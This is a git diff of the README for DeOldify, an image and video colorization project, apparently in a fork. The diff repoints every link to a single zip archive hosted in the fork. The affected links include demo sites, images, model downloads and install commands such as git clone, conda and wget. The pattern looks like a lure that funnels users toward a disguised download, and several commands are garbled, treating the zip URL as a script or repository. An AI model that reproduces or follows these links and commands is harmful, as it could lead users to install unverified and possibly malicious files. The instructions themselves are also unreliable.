@@ -1,28 +1,28 @@
 
 # DeOldify
 
-**Quick Start**: The easiest way to colorize images using open source DeOldify (for free!) is here: [DeOldify Image Colorization on DeepAI](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+**Quick Start**: The easiest way to colorize images using open source DeOldify (for free!) is here: [DeOldify Image Colorization on DeepAI](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
-**Desktop (New)**: Want to run open source DeOldify for photos on Windows desktop? ColorfulSoft made such a thing here and it really works-  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip . No GPU required!
+**Desktop (New)**: Want to run open source DeOldify for photos on Windows desktop? ColorfulSoft made such a thing here and it really works-  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip . No GPU required!
 
-The **most advanced** version of DeOldify image colorization is available here, exclusively.  Try a few images for free! [MyHeritage In Color](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+The **most advanced** version of DeOldify image colorization is available here, exclusively.  Try a few images for free! [MyHeritage In Color](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
-**Huggingface Web Demo (New)**: Integrated to [Huggingface Spaces](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip) with [Gradio](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip). See demo: [![Hugging Face Spaces](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip%F0%9F%A4%97%20Hugging%20Face-Spaces-blue)](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+**Huggingface Web Demo (New)**: Integrated to [Huggingface Spaces](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip) with [Gradio](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip). See demo: [![Hugging Face Spaces](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip%F0%9F%A4%97%20Hugging%20Face-Spaces-blue)](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 ----------------------------
 
-Image (artistic) [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip) |
-Video [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+Image (artistic) [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip) |
+Video [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 **NEW** Having trouble with the default image colorizer, aka "artistic"?  Try the "stable" one below.  It generally won't produce colors that are as interesting as "artistic", but the glitches are noticeably reduced.  
 
-Image (stable) [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+Image (stable) [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Instructions on how to use the Colabs above have been kindly provided in video tutorial form by Old Ireland in Colour's John Breslin.  It's great! Click video image below to watch.
 
-[![](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+[![](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
-Get more updates on [Twitter <img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" width="16">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip).
+Get more updates on [Twitter <img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" width="16">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip).
 
 
 ## Table of Contents
@@ -61,59 +61,59 @@ We'll get into the details in a bit, but first let's see some pretty pictures an
 
 #### Facebook F8 Demo
 
-[![](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+[![](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 #### Silent Movie Examples
 
-[![](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+[![](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 ## Example Images
 
 "Migrant Mother" by Dorothea Lange (1936)
 
-![Migrant Mother](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Migrant Mother](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Woman relaxing in her livingroom in Sweden (1920)
 
-![Sweden Living Room](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Sweden Living Room](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 "Toffs and Toughs" by Jimmy Sime (1937)
 
-![Class Divide](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Class Divide](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Thanksgiving Maskers (1911)
 
-![Thanksgiving Maskers](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Thanksgiving Maskers](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Glen Echo Madame Careta Gypsy Camp in Maryland (1925)
 
-![Gypsy Camp](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Gypsy Camp](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 "Mr. and Mrs. Lemuel Smith and their younger children in their farm house, Carroll County, Georgia." (1941)
 
-![Georgia Farmhouse](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip) 
+![Georgia Farmhouse](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip) 
 
 "Building the Golden Gate Bridge" (est 1937)
 
-![Golden Gate Bridge](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Golden Gate Bridge](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 > **Note:**  What you might be wondering is while this render looks cool, are the colors accurate? The original photo certainly makes it look like the towers of the bridge could be white. We looked into this and it turns out the answer is no - the towers were already covered in red primer by this time. So that's something to keep in mind- historical accuracy remains a huge challenge!
 
 "Terrasse de café, Paris" (1925)
 
-![Cafe Paris](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Cafe Paris](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Norwegian Bride (est late 1890s)
 
-![Norwegian Bride](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Norwegian Bride](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Zitkála-Šá (Lakota: Red Bird), also known as Gertrude Simmons Bonnin (1898)
 
-![Native Woman](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Native Woman](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Chinese Opium Smokers (1880)
 
-![Opium Real](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Opium Real](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 
 ## Stuff That Should Probably Be In A Paper
@@ -124,17 +124,17 @@ NoGAN training is crucial to getting the kind of stable and colorful images seen
 
 In addition to improved video stability, there is an interesting thing going on here worth mentioning. It turns out the models I run, even different ones and with different training structures, keep arriving at more or less the same solution.  That's even the case for the colorization of things you may think would be arbitrary and unknowable, like the color of clothing, cars, and even special effects (as seen in "Metropolis").  
 
-![Metropolis Special FX](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Metropolis Special FX](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 My best guess is that the models are learning some interesting rules about how to colorize based on subtle cues present in the black and white images that I certainly wouldn't expect to exist.  This result leads to nicely deterministic and consistent results, and that means you don't have track model colorization decisions because they're not arbitrary.  Additionally, they seem remarkably robust so that even in moving scenes the renders are very consistent.
 
-![Moving Scene Example](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Moving Scene Example](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Other ways to stabilize video add up as well. First, generally speaking rendering at a higher resolution (higher render_factor) will increase stability of colorization decisions.  This stands to reason because the model has higher fidelity image information to work with and will have a greater chance of making the "right" decision consistently.  Closely related to this is the use of resnet101 instead of resnet34 as the backbone of the generator- objects are detected more consistently and correctly with this. This is especially important for getting good, consistent skin rendering.  It can be particularly visually jarring if you wind up with "zombie hands", for example.
 
-![Zombie Hand Example](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Zombie Hand Example](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
-Additionally, gaussian noise augmentation during training appears to help but at this point the conclusions as to just how much are bit more tenuous (I just haven't formally measured this yet).  This is loosely based on work done in style transfer video, described here:  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip  
+Additionally, gaussian noise augmentation during training appears to help but at this point the conclusions as to just how much are bit more tenuous (I just haven't formally measured this yet).  This is loosely based on work done in style transfer video, described here:  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip  
 
 Special thanks go to Rani Horev for his contributions in implementing this noise augmentation.
 
@@ -144,11 +144,11 @@ This is a new type of GAN training that I've developed to solve some key problem
 
 **Original DeOldify Model**
 
-![Before Flicker](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![Before Flicker](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 **NoGAN-Based DeOldify Model**
 
-![After Flicker](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+![After Flicker](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 The steps are as follows: First train the generator in a conventional way by itself with just the feature loss. Next, generate images from that, and train the critic on distinguishing between those outputs and real images as a basic binary classifier. Finally, train the generator and critic together in a GAN setting (starting right at the target size of 192px in this case).  Now for the weird part:  All the useful GAN training here only takes place within a very small window of time.  There's an inflection point where it appears the critic has transferred everything it can that is useful to the generator. Past this point, image quality oscillates between the best that you can get at the inflection point, or bad in a predictable way (orangish skin, overly red lips, etc).  There appears to be no productive training after the inflection point.  And this point lies within training on just 1% to 3% of the Imagenet Data!  That amounts to about 30-60 minutes of training at 192px.  
 
@@ -158,7 +158,7 @@ Another key thing about NoGAN training is you can repeat pretraining the critic 
 
 Keep in mind- I haven't been entirely rigorous in figuring out what all is going on in NoGAN- I'll save that for a paper. That means there's a good chance I'm wrong about something.  But I think it's definitely worth putting out there now because I'm finding it very useful- it's solving basically much of my remaining problems I had in DeOldify.
 
-This builds upon a technique developed in collaboration with Jeremy Howard and Sylvain Gugger for https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip's Lesson 7 in version 3 of Practical Deep Learning for Coders Part I. The particular lesson notebook can be found here: https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip  
+This builds upon a technique developed in collaboration with Jeremy Howard and Sylvain Gugger for https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip's Lesson 7 in version 3 of Practical Deep Learning for Coders Part I. The particular lesson notebook can be found here: https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip  
 
 ## Why Three Models?
 
@@ -178,11 +178,11 @@ Ideally, eventually these three models will be consolidated into one that has al
 
 This is a deep learning based model.  More specifically, what I've done is combined the following approaches:
 
-### [Self-Attention Generative Adversarial Network](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+### [Self-Attention Generative Adversarial Network](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 Except the generator is a **pretrained U-Net**, and I've just modified it to have the spectral normalization and self-attention.  It's a pretty straightforward translation.
 
-### [Two Time-Scale Update Rule](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+### [Two Time-Scale Update Rule](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 This is also very straightforward – it's just one to one generator/critic iterations and higher critic learning rate.
 This is modified to incorporate a "threshold" critic loss that makes sure that the critic is "caught up" before moving on to generator training.
@@ -214,7 +214,7 @@ So that's the gist of this project – I'm looking to make old photos and film l
 In the meantime though this is going to be my baby and I'll be actively updating and improving the code over the foreseeable future.
 I'll try to make this as user-friendly as possible, but I'm sure there's going to be hiccups along the way.
 
-Oh and I swear I'll document the code https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip  Admittedly I'm *one of those* people who believes in "self documenting code" (LOL).
+Oh and I swear I'll document the code https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip  Admittedly I'm *one of those* people who believes in "self documenting code" (LOL).
 
 ## Getting Started Yourself
 
@@ -222,8 +222,8 @@ Oh and I swear I'll document the code https://raw.githubusercontent.com/AvishekI
 
 The easiest way to get started is to go straight to the Colab notebooks: 
 
-Image [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-| Video [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip) 
+Image [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+| Video [<img src="https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" align="center">](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip) 
 
 Special thanks to Matt Robinson and María Benavente for their image Colab notebook contributions, and Robert Bell for the video Colab notebook work!
 
@@ -243,9 +243,9 @@ You should now be able to do a simple install with Anaconda. Here are the steps:
 Open the command line and navigate to the root folder you wish to install.  Then type the following commands 
 
 ```console
-git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip DeOldify
+git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip DeOldify
 cd DeOldify
-conda env create -f https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+conda env create -f https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 ```
 
 Then start running with these commands:
@@ -259,7 +259,7 @@ From there you can start running the notebooks in Jupyter Lab, via the url they 
 
 > **Note:** You can also now do "conda activate deoldify" if you have the latest version of conda and in fact that's now recommended. But a lot of people don't have that yet so I'm not going to make it the default instruction here yet.
 
-**Alternative Install:** User daddyparodz has kindly created an installer script for Ubuntu, and in particular Ubuntu on WSL, that may make things easier:  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+**Alternative Install:** User daddyparodz has kindly created an installer script for Ubuntu, and in particular Ubuntu on WSL, that may make things easier:  https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 
 #### Note on test_images Folder
 
@@ -267,7 +267,7 @@ The images in the `test_images` folder have been removed because they were using
 
 #### Typical training
 
-The notebook `ColorizeTrainingWandb` has been created to log and monitor results through [Weights & Biases](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip). You can find a description of typical training by consulting [W&B Report](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip%2FDeOldify).
+The notebook `ColorizeTrainingWandb` has been created to log and monitor results through [Weights & Biases](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip). You can find a description of typical training by consulting [W&B Report](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip%2FDeOldify).
 
 
 ## Docker
@@ -277,7 +277,7 @@ We have build for you a quickstart script for you in order to get up to speed in
 
 ### Quickstart usage
 ```console
-https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 missing first argument
 
 	  _____        ____  _     _ _  __
@@ -290,21 +290,21 @@ missing first argument
 	                                   |___/
 
 
-usage : https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip notebook password -- to start the notebook with password
+usage : https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip notebook password -- to start the notebook with password
              leave empty for no password (not recommended)
-usage : https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip image_api  -- to start image api
-usage : https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip video_api  -- to start video api
+usage : https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip image_api  -- to start image api
+usage : https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip video_api  -- to start video api
 ```
 
 ### Quickstart jupyter notebook
 Cloning
 ```console
-git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip DeOldify
+git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip DeOldify
 ```
 
 Starting the notebook
 ```console
-cd DeOldify && https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip notebook my_super_password
+cd DeOldify && https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip notebook my_super_password
 ```
 
 your notebook will be accessible on port 8888
@@ -312,17 +312,17 @@ your notebook will be accessible on port 8888
 ### Quickstart APIs
 Cloning
 ```console
-git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip DeOldify
+git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip DeOldify
 ```
 
 Starting the image api
 ```console
-cd DeOldify && https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip image_api
+cd DeOldify && https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip image_api
 ```
 
 Starting the video api
 ```console
-cd DeOldify && https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip image_api
+cd DeOldify && https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip image_api
 ```
 your API will be accessible on port 5000
 
@@ -332,7 +332,7 @@ You can build and run the docker using the following process:
 
 Cloning
 ```console
-git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip DeOldify
+git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip DeOldify
 ```
 
 Building Docker
@@ -342,7 +342,7 @@ cd DeOldify && docker build -t deoldify_jupyter -f Dockerfile .
 
 Running Docker
 ```console
-echo "http://$(curl https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip):8888" && nvidia-docker run --ipc=host --env NOTEBOOK_PASSWORD="pass123" -p 8888:8888 -it deoldify_jupyter
+echo "http://$(curl https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip):8888" && nvidia-docker run --ipc=host --env NOTEBOOK_PASSWORD="pass123" -p 8888:8888 -it deoldify_jupyter
 ```
 
 ### Docker for API
@@ -351,106 +351,106 @@ You can build and run the docker using the following process:
 
 Cloning
 ```console
-git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip DeOldify
+git clone https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip DeOldify
 ```
 
 Building Docker
 ```console
 cd DeOldify && docker build -t deoldify_api -f Dockerfile-api .
 ```
-> **Note:** The above command produces a docker image configured for image processing.  To build a docker image for video processing, edit the Dockerfile-api file, replacing `CMD ["https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip"]` with `CMD ["https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip"]`
+> **Note:** The above command produces a docker image configured for image processing.  To build a docker image for video processing, edit the Dockerfile-api file, replacing `CMD ["https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip"]` with `CMD ["https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip"]`
 
 Running Docker
 ```console
-echo "http://$(curl https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip):5000" && nvidia-docker run --ipc=host -p 5000:5000 -d deoldify_api
+echo "http://$(curl https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip):5000" && nvidia-docker run --ipc=host -p 5000:5000 -d deoldify_api
 ```
 
 Calling the API for image processing for a remote image
 ```console
-curl -X POST "http://MY_SUPER_API_IP:5000/process" -H "accept: image/png" -H "Content-Type: application/json" -d "{\"url\":\"https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip\", \"render_factor\":35}" --output https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+curl -X POST "http://MY_SUPER_API_IP:5000/process" -H "accept: image/png" -H "Content-Type: application/json" -d "{\"url\":\"https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip\", \"render_factor\":35}" --output https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 ```
 
 Calling the API for image processing for a local image
 ```console
-curl -X POST "http://MY_SUPER_API_IP:5000/process" -H "accept: image/png" -H "Content-Type: image/jpeg" -F "https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" -F "render_factor=35" --output https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+curl -X POST "http://MY_SUPER_API_IP:5000/process" -H "accept: image/png" -H "Content-Type: image/jpeg" -F "https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" -F "render_factor=35" --output https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 ```
 
 Calling the API for video processing for a remote video
 ```console
-curl -X POST "http://MY_SUPER_API_IP:5000/process" -H "accept: application/octet-stream" -H "Content-Type: application/json" -d "{\"url\":\"https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip\", \"render_factor\":35}" --output https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+curl -X POST "http://MY_SUPER_API_IP:5000/process" -H "accept: application/octet-stream" -H "Content-Type: application/json" -d "{\"url\":\"https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip\", \"render_factor\":35}" --output https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 ```
 
 Calling the API for video processing for a local video
 ```console
-curl -X POST "http://MY_SUPER_API_IP:5000/process" -H "accept: application/octet-stream" -H "Content-Type: video/mpeg" -F "https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip"  -F "render_factor=35" --output https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+curl -X POST "http://MY_SUPER_API_IP:5000/process" -H "accept: application/octet-stream" -H "Content-Type: video/mpeg" -F "https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip"  -F "render_factor=35" --output https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 ```
-> **Note:** If you don't have Nvidia Docker, [here](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip(version-2.0)#installing-version-20) is the installation guide.
+> **Note:** If you don't have Nvidia Docker, [here](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip(version-2.0)#installing-version-20) is the installation guide.
 
 ### Caching the model to improve API booting time
 The API is made to download the model (if not already present locally) at boot time.
 
 Adding the your model to the local subdirectory of the project "data/models" for instance :
-- "https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" (image model)
-- "https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip" (video model)
+- "https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" (image model)
+- "https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip" (video model)
 
 both models are available here:
-- [Image Model](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
-- [Video Model](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip)
+- [Image Model](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
+- [Video Model](https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip)
 
 for ubuntu you could do :
 ```bash
-$ wget -O https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip
+$ wget -O https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip
 $ ## Then build the image
 $ docker build -t api -f Dockerfile-api .
 ```
 
 ### Installation Details
 
-This project is built around the wonderful https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/test_images/DeOldify_1.0.zip library.  Prereqs, in summary:
+This project is built around the wonderful https://raw.githubusercontent.com/AvishekInvincible/DeOldify/master/resource_images/De_Oldify_1.2.zip library.  Prereqs, in summary:
 
